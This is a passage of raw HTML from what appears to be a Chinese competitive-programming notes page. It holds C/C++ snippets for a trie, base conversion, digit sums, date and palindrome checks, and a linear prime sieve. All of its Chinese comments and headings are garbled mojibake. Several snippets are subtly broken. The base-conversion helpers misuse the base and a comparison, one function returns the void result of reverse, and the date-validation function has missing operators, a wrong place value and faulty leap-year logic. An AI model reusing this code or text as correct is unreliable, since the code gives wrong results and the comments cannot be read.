class="hljs-built_in">endl</span>;  <span class="hljs-comment">// ç»“æœåº”è¯¥æ˜¯ 1</span><br><br>    <span class="hljs-comment">// å‰ç¼€åŒ¹é…ï¼Œè¿”å›å‰ç¼€ä¸º &quot;ba&quot; çš„å•è¯æ•°é‡</span><br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Prefix &#x27;ba&#x27; count: &quot;</span> &lt;&lt; prefixCount(<span class="hljs-string">&quot;ba&quot;</span>) &lt;&lt; <span class="hljs-built_in">endl</span>;  <span class="hljs-comment">// ç»“æœåº”è¯¥æ˜¯ 3 (banana, bat, ball)</span><br><br>    <span class="hljs-comment">// è‡ªåŠ¨è¡¥å…¨ï¼Œè¾“å…¥ &quot;ba&quot; åï¼Œè¾“å‡ºæ‰€æœ‰ä»¥ &quot;ba&quot; å¼€å¤´çš„å•è¯</span><br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Auto-complete for &#x27;ba&#x27;: &quot;</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    autoComplete(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;ba&quot;</span>);  <span class="hljs-comment">// è¾“å‡º &quot;banana&quot;, &quot;bat&quot;, &quot;ball&quot;</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><hr><h2 id="äºŒåäºŒ-æ•°å­¦çŸ¥è¯†"><a href="#äºŒåäºŒ-æ•°å­¦çŸ¥è¯†" class="headerlink" title="äºŒåäºŒ.æ•°å­¦çŸ¥è¯†"></a>äºŒåäºŒ.æ•°å­¦çŸ¥è¯†</h2><h3 id="è¿›åˆ¶è½¬æ¢"><a href="#è¿›åˆ¶è½¬æ¢" class="headerlink" title="è¿›åˆ¶è½¬æ¢"></a>è¿›åˆ¶è½¬æ¢</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">calc</span><span class="hljs-params">(<span class="hljs-type">char</span> c)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (c &gt;= <span class="hljs-string">&#x27;9&#x27;</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">10</span> + c - <span class="hljs-string">&#x27;A&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> c - <span class="hljs-string">&#x27;0&#x27;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">change</span><span class="hljs-params">(<span class="hljs-type">int</span> k, string s)</span> </span>&#123;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; s.<span class="hljs-built_in">size</span>(); i++) &#123;<br>        ans = ans * <span class="hljs-number">10</span> + <span class="hljs-built_in">calc</span>(s[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//è¿™æ®µä»£ç çš„ç›®çš„æ˜¯å°†ä¸€ä¸ªæ•´æ•° x è½¬æ¢ä¸ºåŸºæ•° kï¼ˆå³è¿›åˆ¶ï¼‰è¡¨ç¤ºçš„å­—ç¬¦ä¸²ã€‚</span><br><br><span class="hljs-function">string <span class="hljs-title">change</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> k)</span> </span>&#123;<br>    string ans = <span class="hljs-string">&quot;&quot;</span>; <span class="hljs-comment">// åˆå§‹åŒ–ç©ºå­—ç¬¦ä¸²ï¼Œç”¨äºå­˜å‚¨è½¬æ¢ç»“æœ</span><br>    <span class="hljs-keyword">while</span> (x != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-type">int</span> t = x % k; <span class="hljs-comment">// è®¡ç®— x å¯¹ k å–ä½™ï¼Œå¾—åˆ°å½“å‰ä½çš„å€¼</span><br><br>        <span class="hljs-comment">// å¦‚æœä½™æ•°å°äº10ï¼Œç›´æ¥å°†å…¶è½¬ä¸ºå­—ç¬¦å¹¶è¿½åŠ åˆ°ç»“æœå­—ç¬¦ä¸²</span><br>        <span class="hljs-keyword">if</span> (t &lt;= <span class="hljs-number">9</span>) &#123;<br>            ans = ans + (<span class="hljs-type">char</span>)(<span class="hljs-string">&#x27;0&#x27;</span> + t); <span class="hljs-comment">// &#x27;0&#x27; + t è½¬ä¸ºå¯¹åº”æ•°å­—å­—ç¬¦</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// å¦‚æœä½™æ•°å¤§äº9ï¼Œè¡¨ç¤ºæ˜¯ A, B, C, ..., Z ç­‰è¡¨ç¤º (ä¾‹å¦‚10ä¸ºA, 11ä¸ºBç­‰)</span><br>            ans = ans + (<span class="hljs-type">char</span>)(<span class="hljs-string">&#x27;A&#x27;</span> + (t - <span class="hljs-number">10</span>)); <span class="hljs-comment">// &#x27;A&#x27; + (t - 10) è½¬ä¸ºå¯¹åº”å­—ç¬¦</span><br>        &#125;<br>        x = x / k; <span class="hljs-comment">// æ›´æ–° xï¼Œé™¤ä»¥ k</span><br>    &#125;<br><br>    <span class="hljs-comment">// å°†ç»“æœå­—ç¬¦ä¸²ååºå¹¶è¿”å›ï¼Œreverse æ˜¯åè½¬å­—ç¬¦ä¸²çš„æ ‡å‡†æ“ä½œ</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">reverse</span>(ans.<span class="hljs-built_in">begin</span>(), ans.<span class="hljs-built_in">end</span>());<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//è¿™æ®µä»£ç çš„åŠŸèƒ½æ˜¯ç»Ÿè®¡ä» 1 åˆ° 2024 ä¹‹é—´ç¬¦åˆç‰¹å®šæ¡ä»¶çš„æ•°å­—çš„ä¸ªæ•°ã€‚ä¸€ä¸ªæ•°å­—åœ¨äºŒè¿›åˆ¶ä¸‹å’Œå››è¿›åˆ¶ä¸‹çš„å„ä½æ•°å­—ä¹‹å’Œç›¸ç­‰ã€‚</span><br><br><br>using namespace <span class="hljs-built_in">std</span>;<br><span class="hljs-comment">// è®¡ç®—xåœ¨bè¿›åˆ¶ä¸‹çš„å„ä½æ•°å­—ä¹‹å’Œ</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sumB</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> b)</span> &#123;<br>    <span class="hljs-type">int</span> sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (x) &#123;<br>        sum = sum + x % b;  <span class="hljs-comment">// è·å–xåœ¨bè¿›åˆ¶ä¸‹çš„å½“å‰ä½ï¼Œå¹¶åŠ åˆ°sum</span><br>        x = x / b;  <span class="hljs-comment">// å°†xé™¤ä»¥bï¼Œç»§ç»­å¤„ç†ä¸‹ä¸€ä½</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> sum;  <span class="hljs-comment">// è¿”å›å„ä½æ•°å­—ä¹‹å’Œ</span><br>&#125;<br><br><span class="hljs-comment">// æ£€æŸ¥xæ˜¯å¦åœ¨äºŒè¿›åˆ¶å’Œå››è¿›åˆ¶ä¸‹çš„æ•°å­—å’Œç›¸ç­‰</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">check</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> &#123;<br>    <span class="hljs-keyword">return</span> sumB(x, <span class="hljs-number">2</span>) == sumB(x, <span class="hljs-number">4</span>);  <span class="hljs-comment">// æ¯”è¾ƒäºŒè¿›åˆ¶å’Œå››è¿›åˆ¶ä¸‹æ•°å­—å’Œæ˜¯å¦ç›¸ç­‰</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;  <span class="hljs-comment">// ç”¨æ¥è®°å½•ç¬¦åˆæ¡ä»¶çš„æ•°å­—ä¸ªæ•°</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">2024</span>; i++) &#123;  <span class="hljs-comment">// ä»1åˆ°2024çš„æ¯ä¸ªæ•°å­—</span><br>        <span class="hljs-keyword">if</span> (check(i)) &#123;  <span class="hljs-comment">// å¦‚æœcheck(i)è¿”å›trueï¼Œè¯´æ˜æ»¡è¶³æ¡ä»¶</span><br>            ans++;  <span class="hljs-comment">// æ»¡è¶³æ¡ä»¶çš„æ•°å­—ä¸ªæ•°+1</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, ans);  <span class="hljs-comment">// è¾“å‡ºç¬¦åˆæ¡ä»¶çš„æ•°å­—ä¸ªæ•°</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="æ—¥æœŸé—®é¢˜"><a href="#æ—¥æœŸé—®é¢˜" class="headerlink" title="æ—¥æœŸé—®é¢˜"></a>æ—¥æœŸé—®é¢˜</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">// æ¯æœˆå¤©æ•°æ•°ç»„ï¼Œå¹³å¹´é»˜è®¤æ˜¯28å¤©</span><br><span class="hljs-type">int</span> months[] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">31</span>, <span class="hljs-number">28</span>, <span class="hljs-number">31</span>, <span class="hljs-number">30</span>, <span class="hljs-number">31</span>, <span class="hljs-number">30</span>, <span class="hljs-number">31</span>, <span class="hljs-number">31</span>, <span class="hljs-number">30</span>, <span class="hljs-number">31</span>, <span class="hljs-number">30</span>, <span class="hljs-number">31</span>&#125;; <br><span class="hljs-comment">// å¯¹åº”æ•°å­—çš„æ±‰å­—æ•°ç»„</span><br><span class="hljs-type">int</span> hz[] = &#123;<span class="hljs-number">13</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>&#125;;<br><br><span class="hljs-comment">// åˆ¤æ–­é—°å¹´å‡½æ•°</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">leap</span><span class="hljs-params">(<span class="hljs-type">int</span> year)</span> &#123;<br>    <span class="hljs-comment">// é—°å¹´æ¡ä»¶ï¼šæ˜¯400çš„å€æ•°ï¼Œæˆ–è€…æ˜¯4çš„å€æ•°ä¸”ä¸æ˜¯100çš„å€æ•°</span><br>    <span class="hljs-keyword">return</span> (year % <span class="hljs-number">400</span> == <span class="hljs-number">0</span>) || (year % <span class="hljs-number">4</span> == <span class="hljs-number">0</span> &amp;&amp; year % <span class="hljs-number">100</span> != <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment">// ä¸»é€»è¾‘å¤„ç†å‡½æ•°</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">solve</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;  <span class="hljs-comment">// ç”¨æ¥è®°å½•ç¬¦åˆæ¡ä»¶çš„æ—¥æœŸæ•°é‡</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> year = <span class="hljs-number">2000</span>; year &lt;= <span class="hljs-number">2024</span>; year++) &#123;  <span class="hljs-comment">// éå†æ¯å¹´</span><br>        <span class="hljs-comment">// è®¾ç½®å½“å‰å¹´ä»½çš„æœˆä»½å¤©æ•°</span><br>        <span class="hljs-keyword">if</span> (leap(year)) months[<span class="hljs-number">2</span>] = <span class="hljs-number">29</span>;<br>        <span class="hljs-keyword">else</span> months[<span class="hljs-number">2</span>] = <span class="hljs-number">28</span>;<br><br>        <span class="hljs-comment">// éå†æ¯æœˆ</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> month = <span class="hljs-number">1</span>; month &lt;= <span class="hljs-number">12</span>; month++) &#123;<br>            <span class="hljs-comment">// éå†æ¯å¤©</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> day = <span class="hljs-number">1</span>; day &lt;= months[month]; day++) &#123;<br>                <span class="hljs-type">int</span> cnt = <span class="hljs-number">0</span>;  <span class="hljs-comment">// å½“å¤©æ—¥æœŸçš„å„ä½æ•°å­—ä¹‹å’Œ</span><br>                <span class="hljs-type">int</span> y1, y2, y3, y4, m1, m2, d1, d2;  <span class="hljs-comment">// ç”¨æ¥å­˜å‚¨å¹´ä»½ã€æœˆä»½å’Œæ—¥æœŸçš„å„ä¸ªæ•°å­—</span><br><br>                y1 = year / <span class="hljs-number">1000</span>;  <span class="hljs-comment">// å¹´ä»½çš„åƒä½</span><br>                y2 = year / <span class="hljs-number">100</span> % <span class="hljs-number">10</span>;  <span class="hljs-comment">// å¹´ä»½çš„ç™¾ä½</span><br>                y3 = year / <span class="hljs-number">10</span> % <span class="hljs-number">10</span>;  <span class="hljs-comment">// å¹´ä»½çš„åä½</span><br>                y4 = year % <span class="hljs-number">10</span>;  <span class="hljs-comment">// å¹´ä»½çš„ä¸ªä½</span><br>                m1 = month / <span class="hljs-number">10</span>;  <span class="hljs-comment">// æœˆä»½çš„åä½</span><br>                m2 = month % <span class="hljs-number">10</span>;  <span class="hljs-comment">// æœˆä»½çš„ä¸ªä½</span><br>                d1 = day / <span class="hljs-number">10</span>;  <span class="hljs-comment">// æ—¥æœŸçš„åä½</span><br>                d2 = day % <span class="hljs-number">10</span>;  <span class="hljs-comment">// æ—¥æœŸçš„ä¸ªä½</span><br><br>                <span class="hljs-comment">// è®¡ç®—æ—¥æœŸæ•°å­—å’Œ</span><br>                cnt = cnt + hz[y1] + hz[y2] + hz[y3] + hz[y4] + hz[m1] + hz[m2] + hz[d1] + hz[d2];<br>                <br>                <span class="hljs-comment">// è‹¥æƒå€¼å’Œå¤§äº50ï¼Œè®¡å…¥ç­”æ¡ˆ</span><br>                <span class="hljs-keyword">if</span> (cnt &gt; <span class="hljs-number">50</span>) ans++;<br><br>                <span class="hljs-comment">// è‹¥åˆ°è¾¾2024å¹´4æœˆ13æ—¥ï¼Œè¾“å‡ºç»“æœå¹¶ç»“æŸ</span><br>                <span class="hljs-keyword">if</span> (year == <span class="hljs-number">2024</span> &amp;&amp; month == <span class="hljs-number">4</span> &amp;&amp; day == <span class="hljs-number">13</span>) &#123;<br>                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, ans);<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    solve();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>é—°å¹´å¤„ç†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">DaysOfMonth</span><span class="hljs-params">(<span class="hljs-type">int</span> y,<span class="hljs-type">int</span> m)</span><span class="hljs-comment">//2æœˆå¤„ç† </span><br>&#123;<br><span class="hljs-keyword">if</span>(m==<span class="hljs-number">2</span>)<br>&#123;<br><span class="hljs-keyword">return</span> is_leap(y)+<span class="hljs-number">28</span>;<br>&#125;<br><span class="hljs-keyword">return</span> day[m];<br>&#125;<br></code></pre></td></tr></table></figure><p>å›æ–‡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">bool</span> <span class="hljs-title function_">is_pali</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span><span class="hljs-comment">//æ˜¯å¦å›æ–‡ </span><br>&#123;<br><span class="hljs-built_in">string</span> str=to_string(x);<br><span class="hljs-built_in">string</span> s=str;<br>reverse(s.begin(),s.end());<br><span class="hljs-keyword">return</span> s==str;<br>&#125;<br></code></pre></td></tr></table></figure><p>ababåˆ¤æ–­ï¼ˆåœ¨å›æ–‡çš„å‰æä¸‹ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">bool</span> <span class="hljs-title function_">is_ab</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span><span class="hljs-comment">//ababåˆ¤æ–­ </span><br>&#123;<br><span class="hljs-built_in">string</span> str=to_string(x);<br><span class="hljs-keyword">return</span> str[<span class="hljs-number">0</span>]==str[<span class="hljs-number">2</span>]&amp;&amp;str[<span class="hljs-number">1</span>]==str[<span class="hljs-number">3</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p>æ—¥æœŸåˆæ³•</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">bool</span> <span class="hljs-title function_">is_valid</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span><span class="hljs-comment">//æ—¥æœŸåˆæ³• </span><br>&#123;<br><span class="hljs-built_in">string</span> str=to_string(x);<br>year=(str[<span class="hljs-number">0</span>]<span class="hljs-number">-48</span>)<span class="hljs-number">1000</span>+(str[<span class="hljs-number">1</span>]<span class="hljs-number">-48</span>)<span class="hljs-number">100</span>+(str[<span class="hljs-number">2</span>]<span class="hljs-number">-48</span>)<span class="hljs-number">100</span>+str[<span class="hljs-number">3</span>]<span class="hljs-number">-48</span>;<br>month=(str[<span class="hljs-number">4</span>]<span class="hljs-number">-48</span>)<span class="hljs-number">10</span>+str[<span class="hljs-number">5</span>]<span class="hljs-number">-48</span>;<br>day=str[<span class="hljs-number">6</span>]*<span class="hljs-number">10</span>+str[<span class="hljs-number">7</span>];<br><span class="hljs-keyword">if</span>(month&lt;=<span class="hljs-number">12</span>&amp;&amp;day&lt;=day[month]) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">if</span>(year%<span class="hljs-number">400</span>==<span class="hljs-number">0</span>||year%<span class="hljs-number">100</span>!=<span class="hljs-number">0</span>&amp;&amp;year%<span class="hljs-number">4</span>==<span class="hljs-number">0</span>) <br>&#123;<br><span class="hljs-keyword">if</span>(month==<span class="hljs-number">2</span>&amp;&amp;day==<span class="hljs-number">29</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="çº¿æ€§ç­›æ³•æ±‚è´¨æ•°"><a href="#çº¿æ€§ç­›æ³•æ±‚è´¨æ•°" class="headerlink" title="çº¿æ€§ç­›æ³•æ±‚è´¨æ•°"></a>çº¿æ€§ç­›æ³•æ±‚è´¨æ•°</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ç›®çš„ï¼š 2-nçš„æ‰€æœ‰è´¨æ•°</span><br><span class="hljs-comment"> * æ­¥éª¤ï¼šä»2å¼€å§‹éå†æ‰€æœ‰å°äºç­‰äºnçš„æ•´æ•°ï¼Œæ ‡è®°å‡ºåˆæ•°ï¼Œæœ€ç»ˆå¾—åˆ°æ‰€æœ‰æœªè¢«æ ‡è®°ä¸ºåˆæ•°çš„æ•°å³ä¸ºè´¨æ•°ã€‚</span><br><span class="hljs-comment"> * è¾“å…¥ï¼šä¸€ä¸ªæ­£æ•´æ•° n</span><br><span class="hljs-comment"> * è¾“å‡ºï¼šè¾“å‡ºæ‰€æœ‰å°äºæˆ–ç­‰äº n çš„è´¨æ•°</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1e6</span>;  <span class="hljs-comment">// å‡è®¾ä½ è¦å¤„ç†çš„æœ€å¤§æ•°ä¸º 1e6ï¼Œå¯ä»¥æ ¹æ®éœ€æ±‚è°ƒæ•´</span><br><br><span class="hljs-type">long</span> <span class="hljs-type">long</span> primes[N];  <span class="hljs-comment">// å­˜å‚¨æ‰€æœ‰è´¨æ•°</span><br><span class="hljs-type">bool</span> st[N];           <span class="hljs-comment">// st[x]è¡¨ç¤ºxæ˜¯å¦è¢«ç­›æ‰ï¼Œtrueè¡¨ç¤ºxæ˜¯åˆæ•°ï¼Œfalseè¡¨ç¤ºxæ˜¯è´¨æ•°</span><br><span class="hljs-type">int</span> cnt = <span class="hljs-number">0</span>;          <span class="hljs-comment">// ç”¨æ¥è®°å½•è´¨æ•°çš„ä¸ªæ•°</span><br><br><span class="hljs-comment">// çº¿æ€§ç­›æ³•ï¼šç”¨æ¥æ‰¾å‡ºå°äºç­‰äºnçš„æ‰€æœ‰è´¨æ•°</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_primes</span><span class="hljs-params">(<span class="hljs-type">long</span> <span class="hljs-type">long</span> n)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">long</span> <span class="hljs-type">long</span> i = <span class="hljs-number">2</span>; i &lt;= n; i++) &#123;<br>        <span class="hljs-keyword">if</span> (!st[i]) primes[cnt++] = i;  <span class="hljs-comment">// å¦‚æœiæ˜¯è´¨æ•°ï¼Œå°†å…¶è®°å½•</span><br>        <span class="hljs-comment">// å¯¹äºå·²çŸ¥çš„è´¨æ•°ï¼Œä»iå¼€å§‹æ ‡è®°å€æ•°</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">long</span> <span class="hljs-type">long</span> j = <span class="hljs-number">0</span>; primes[j] &lt;= n / i; j++) &#123;<br>            st[primes[j] * i] = <span class="hljs-literal">true</span>;  <span class="hljs-comment">// å°†içš„å€æ•°æ ‡è®°ä¸ºåˆæ•°</span><br>            <span class="hljs-keyword">if</span> (i % primes[j] == <span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;  <span class="hljs-comment">// é˜²æ­¢é‡å¤æ ‡è®°</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> n;<br><br>    <span class="hljs-comment">// è¯»å–è¾“å…¥</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Enter a number to find all primes less than or equal to it: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%lld&quot;</span>, &amp;n);  <span class="hljs-comment">// ä½¿ç”¨scanfè¯»å–long longç±»å‹çš„æ•°</span><br><br>    <span class="hljs-comment">// è°ƒç”¨å‡½æ•°è·å–æ‰€æœ‰è´¨æ•°</span><br>    get_primes(n);<br>    <br>    <span class="hljs-comment">// è¾“å‡ºæ‰€æœ‰è´¨æ•°</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Primes less than or equal to %lld are:\n&quot;</span>, n);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; cnt; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%lld &quot;</span>, primes[i]);  <span class="hljs-comment">// è¾“å‡ºè´¨æ•°</span><br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    <span class="hljs-comment">// ä¸¾ä¸ªç®€å•ä¾‹å­ï¼šè¾“å…¥n=10æ—¶ï¼Œç¨‹åºè¾“å‡º 2 3 5 7</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="è¯•é™¤æ³•åˆ†è§£è´¨å› æ•°"><a href="#è¯•é™¤æ³•åˆ†è§£è´¨å› æ•°" class="headerlink" title="è¯•é™¤æ³•åˆ†è§£è´¨å› æ•°"></a>è¯•é™¤æ³•åˆ†è§£è´¨å› æ•°</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 